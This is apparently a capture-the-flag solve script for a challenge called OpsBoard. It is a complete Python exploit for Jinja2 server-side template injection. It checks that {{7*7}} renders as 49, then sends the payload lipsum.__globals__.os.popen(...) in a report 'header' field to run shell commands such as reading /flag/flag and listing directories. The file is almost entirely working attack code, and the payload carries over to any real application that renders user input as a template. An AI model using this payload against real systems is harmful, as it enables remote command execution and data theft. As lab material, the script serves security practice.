#!/usr/bin/env python3
"""
OpsBoard (inj, 150) — CWE-94 Jinja2 SSTI -> RCE.

The report `header` field is rendered as a Jinja2 template. {{7*7}} -> 49 proves
execution; `lipsum.__globals__.os.popen(...)` reaches os for command execution.

Usage:
    python3 solve.py                          # defaults to inj3.chal.deti:8042
    python3 solve.py http://inj3.chal.deti:8042
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj3.chal.deti:8042"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def render(header: str) -> str:
    return requests.post(f"{BASE}/report", data={"header": header}, timeout=10).text


def rce(cmd: str) -> str:
    return render(f"{{{{ lipsum.__globals__.os.popen('{cmd}').read() }}}}")


def main() -> int:
    if "49" not in render("{{7*7}}"):
        print("[-] no SSTI ({{7*7}} didn't evaluate)")
        return 1
    print("[i] SSTI confirmed (7*7 -> 49)")

    out = rce("cat /flag/flag")
    m = FLAG_RE.search(out)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] no flag; ls:\n{rce('ls -la / /flag /app 2>&1')[:800]}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
